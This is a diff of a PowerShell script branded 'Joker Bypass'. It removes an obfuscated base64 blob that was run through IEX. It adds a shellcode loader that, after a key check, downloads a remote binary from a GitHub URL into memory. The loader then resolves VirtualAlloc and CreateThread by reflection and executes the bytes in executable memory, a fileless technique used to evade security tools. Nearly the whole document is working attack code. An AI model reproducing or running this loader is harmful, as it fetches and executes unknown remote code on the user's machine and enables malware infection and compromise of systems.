@@ -1,3 +1,60 @@
-# Obfuscated by: https://github.com/EvilBytecode
+Clear-Host
+$url = "https://github.com/Gstzin/BypassJoker/raw/main/public/bypass.bin"
 
-$tEkPVQisoKFn = [Text.Encoding]::ASCII.GetString(([Text.Encoding]::ASCII.GetBytes('Cw0aHggMkxlLmdlbzQweD0KKQAwMDAwLCRdOHJaZjpJbFtQdnRXbGhlb2xjLCJvc2AkZXljTWMuU29wdmVyFkN6OHkvc2hycF0hbmN0eX0uZWAgICtTIFUJbS5lcnRudnVtZGlKF0Z2R5ZVREZXxlZWc0UW5yXHRgQGUbSChnIFxscnZpMzVsZGIuRykvYChsIWx1YGxBb0loWFBudDMudSkyX052SWtlb20pclkuKSlzMnQsIl0gWSwJb1VFLCJdVUBbSWtVMz509rb2BGdXVydGhMKCdlbm5yLDMjIW5lcGtuYXVnRmRldEdlbGRl925pb2lQbnVyR3RuYXBUeEAlIWdsZGVhdo0scltVIFluW0B0dFVhdmVUaGVsbmRDcCBHZ2AoRGV0YWJlLCQpklL2Rlbkxlb2hjbGxmICAgaFAkaCd0CikNc29sYSwkZHNoJWxoZgVtTWAkLCwgMCxwJGVyU2ljdmRlbn9wcmZhb2h6OF0uTXMycWFJIFA9eXtTcmRoZCVhNGludS5tZW00ZnVuUnL2UnUCAJbCdvanZHaWBIQnRlbGViLCljKHRgJGU5cQopDCAgIuV0TW9kaGVmRG5laWwgZSZ1JGVsZGlwVHbtcEllbGxpLmMldlNkd15lb3NsaWlTIEcsQWw1YCAnLFZsInRpccZW52aW50bmxpb2dD9W50YXJkY10uclN6OGRlc35SbSwgJyN5W1ZuLW9hbkNsZWZ0aWNnUygudnVGb25ncGFGYWFuZCdlZSltTWwgbykuY2VuUCAkLnVkZ050ZWRpYX1wSWVtbGb3VyZXBTLk1ldGluJXJNYGFzaWN2ay5lcWVtTW0gIDAgICxwJGWSdS50aW55c1Nlb3RoKXIvbExvalB0ZW52a2MgbmVycEt1bmZ1bGV0RWdsZTosX2V6Rh5jdWlvdGVGdGJGb3gQ0nKCAKImFhbWQnZgAkbilwdHJlIHVydH1uRW9hZmxudWV0aGF3bWRpIEUsJ1MobnJ1Y3hlZVV0b2RpRX4gNSBkZQo7DWxoZ29sY3VUdGBleX5DZSVhcmKKZg0uYnVNCCkNCn03NIbCJ0ImlXcS10ZMNjdWNzZXdpb2BzbiByb2VtZmFyZG9VcWRSICAgICAgewkgIC0KIC0KIHAgY2xsZQ9k0Qo7DCAgIWxgZSBzZWAgCiAgICVsZnINISI0Z3VoZVNgRCAlYXhdNLaWBFcFlrYXZLV3etYEdWS0NoRHRKZ0FaZW9yc2RVICAgdGRzVCJ9IXFkdmFybSAtZCgmIXNkdCAKIGlgIlVxLWRzIC5hcmUgbW0OcnhkbE5HdFBlSFpWUCBICgINeG5MQl9ZV5S20KIg9zSGAidCDhcW1hIiBjIQooYENtCiINc2R1dC9zICAiVFJ9IWQlYmFybSAtZXJzZW1uYW4naXVgLlFtbm0KZQR1ICVyc29Dgqfjb8K1bGZDwsOybgdpTG0KZSBkb2BsGhbGluIHMlZ3JudGVEZWBkZW5pY2FjcyVzYXRyaUhlLCAgIFdgIvFsdmQgaWQgc3luIkIgZXlwQnAidC9rSmYpd3JtSGUzIXNKVg0zIHAgCn0NIgQuIC0K0GUpdG9tSg0NC3JKVbUCBzd3lNCykgIiAGbWRpSWUuLlVtbnJ1bCAvLCBwLjpdOXJaZbo6XTVyWm50SWRyUHF0Z2ZvZUREZXxlZWcuUW9pbG91bkZ0amNHcnNlY2ZpZX50cFJvVWxoYjpdOk1zLnNhcJMz50LCJdIF0sSWtVBSkyX0loWW5bSHR0UlBbLC50SW50SWJdMzUud0l0cFByXHRgWSwwLCAkbCAaZjpvLXJHbntJdHRQZWBNIF0sOSkpKW5uSFBudl00c2RQbnJddHtlb2tJKFdWpmdG5jfQ0KDQ0KliBpbQo7DiBvb2dMbQhyVGFkZWtlb2RoKCLGRkZGKkZweCAGREZyb2VtZmFnXW51cSRQCgkNIC0KIC0KICAgaW0yYA0gKCAgIGFgcKBbICRyc3AgICAgIC2EZpdlNvcGwkb2FgVpVjamksdCdsbm9iZU5vaG9wR3VlcnRoTignZWJuMiwzYyVuZXBrdDluXSMyXSRyW0wgkSkpKW5uS0loWF0udHxlZWF0Z2hnICREZXZbSCh0UW55cVRgQGUmViaCBjdWNFYU9oL7FtTmAtZSYoSW8uJFJHZS5NZXRhcCRlb3NXfCkgb3BGb2RoKCRzJGAgbmhhDQ0gICogR3NhcS5lbSAsZCR9IXBydFNBb2EgZXdlIkZgeikffyRyZGRzIXNI0uZWxsZGdTKCN0eXJUeXRlKXB9KylHZS5zdCxpXFgnbilvcG5TwXFuRWx1YVsnKV0tMG90ayckcXZ0aWVlTpRtJHA9cCogDQAgICFvZ3NuVnQNaCdybWN2YW5zTmZlMzluVWIuAgICAgIC4uLi0KIgI0IWxgJD0kcCAzdmVnZSl0b31IICAgcmBXNW50aW51aCJ0I25DbGZgJmN1bmRhbSwsZ0kpZSogDQ9uaWFtTmhJbS5vanZtcHRwXFs2IEwsJGAoJGUobG51CrZm9kbSgpLScudklnbWgkdW9kbCVsQCwgZ2Qob0doJXRHZXRNZlhhZURsbm1vdEVsZHANIDAgCiVsc3A9dCIKIw0gICA0cCBgenklDQkpICogTmxlZSFtAl00cHJgJ0lgWFBudpY3JKJQ0twWVCs4PHdCVuIEA9YkdlaWNsbXJkaGFldXRieyBlctJhYXEgIG50ZWBwZSRzCiVsaGllbGQNbnbkdSAiQ2VvZGNgPGUDY3plU3Qgdy5lYm1PlC5ldWJXZGVzdk5tLBYih1b25jL2ovdGdp00JuLGF5c3NvRml0ez9zSG0KdAxlQ2ItYXJodCJwcHRybHV9ICAuImlKDg0hcXBuY3MQcihhcyBvIEojaXJhe3JyLy9hd0pzc2VvatxpYm9iYyluYWB1L3dEdlc2FzYW9tLkluVSBoKFd8ImxtYXMpZGBEcH1hb20gIDtBKFayZXJ0RW5dOW5Ddjpja2FgLGUtY2V5QmxUb25MdGNhZCFuXyAkcmViaCBjdXJoZU9lL7Jhb2FzbERfICdsLktGljdiBvbQpKDW5mdM5jdWsNIH9rb2BGdX0vdkRsb25pZ2x0LW52dXgkKQJsRGFkYSF0bklvbW5hdWRmdG5jUGFgJ2VzcQopDCAgICJhYXAobSAgCiBQICJhbU5sIWUvZG1sZHVSc0ZSwpKWxEZ2FlZg5SbSZsZWN5W1Rlc3RibW1OYHluQ24zZXNWZWZsZWN0KC1lZWdSXTNzUno6QWVyZXNjVmVpbW5EeS5uKWZEZGVtLkQuaXN0ZW9uaWQCdHlsZWlzZXNibW1bluYWo6XTBwQX9tRGQvbERpbWFyc3VudmVbZF9pDQ0pPSUgVmBboGU5cSBgPCAgIHRgJ3QlY3lgUy1ldmpPYzxlZmRpY3VtdGJlLl5EemVhbW5EZi5pbWZWbH1iKEkoQXljZWNzF0Z20pZVREc3xlZWD5cHRuRGUgIQogJCAhJyNzW1wgb0V0YXNsNWxNdWN0a3R5cS5lbEhsIGVpZE5hbWUhbCViUHljbGNpeVwgZyluc29yd3RmaGVlQW5WU3JUY2Blb3N0J1IoXzZWxuRSksIScmYCRGZSlwTXgnaWVmVH5lZWxkdCdlKWlhbW9jTJ1veUVsZH1lbk9ybWFsZWQsZWljbGBTLCIzcGFgQywucEFDb2liZVF0cGR5ZWlEZ2xlUywzcHVgUCdnLGFDb1bmdudWVmImVBcC1EbngkbCVsc3xpQCQgUm9lc2VwUS5tZnRJbyFuSGxlZGljdmMuZXBbbX0uMFA9dCR0ICSudCRsLWx2bW5lK2tsZSRsCikNJGwgbmhhAHJgJ3VlcCAgICAgIlIkQgbnNvLURlc3hvRi4uLQoiDnVpbmcpbXRjYXB7aCAgICBjfSDgICAyaFdgIQogICAlTXBtZmF0IWNUeC1SUn0udGVueXBTZWN0ZCRgIW5oYCAgICAgIkctZXJqT2UgbGBOPSIDJ5JF0gZGFub3F0RHlbVVtwZWUydSBpXWVydGBvKFFyUG1lYWcgMD0gTCw0a2luIW9pXDEbVSBvbGl9IiAHbFRlcGR5ZVlwJG0gdywuY1BgWSAdXnVkZhhQciNpb3FtcmRlZXbH0gIiANCQ0pKCAKIg4gcmJlJHByICR1ZXUkbW5sIGUAKCBoYCRCbklvbW5hdWRmdG5jcGR5ewUgZ2xlZVF00mFhcChtICAKIFBgIW0KfQpmDQVsc30KdAdnZiBEZXRjdW5vbGl') | Sort-Object { Get-Random -SetSeed 117997084 })); $RD = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($tEkPVQisoKFn)); IEX $RD
+# Baixar os bytes diretamente para a memória
+$webClient = New-Object System.Net.WebClient
+$shellcode = $webClient.DownloadData($url)
+
+function LookupFunc {
+    Param ($moduleName, $functionName)
+    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $tmp = $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$_}} 
+    $handle = $assem.GetMethod('GetModuleHandle').Invoke($null, @($moduleName))
+    [IntPtr] $result = 0
+    try {
+        Write-Host "Continuing..."
+        $result = $tmp[0].Invoke($null, @($handle, $functionName))
+    } catch {
+        Write-Host "Continuing..."
+        $handle = New-Object -TypeName System.Runtime.InteropServices.HandleRef -ArgumentList @($null, $handle)
+        $result = $tmp[0].Invoke($null, @($handle, $functionName))
+    }
+    return $result
+}
+
+function getDelegateType {
+    Param ([Parameter(Position = 0, Mandatory = $True)] [Type[]] $func, [Parameter(Position = 1)] [Type] $delType = [Void])
+    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType','Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
+    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
+    return $type.CreateType()
+}
+
+function ExecuteShellcode {
+    $lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]::Zero, $shellcode.Length, 0x3000, 0x40)
+    [System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $lpMem, $shellcode.Length)
+    $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero, 0, $lpMem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32])([Int]))).Invoke($hThread, 0xFFFFFFFF)
+}
+
+function Login {
+    param (
+        [string]$username
+    )
+
+    $storedUsername = "duqZaykWvKicKpPExthGAJdGmcCVHPGtZeJxNpNdmnLxoYBPHP"
+
+    if ($username -eq $storedUsername) {
+        Write-Host "Login successful!"
+        ExecuteShellcode
+    } else {
+        Write-Host "Invalid credentials. Access denied."
+    }
+}
+
+Write-Host "Joker Bypass"
+Write-Host " "
+$username = Read-Host "Key"
+
+# Chamar a função de login
+Login -username $username
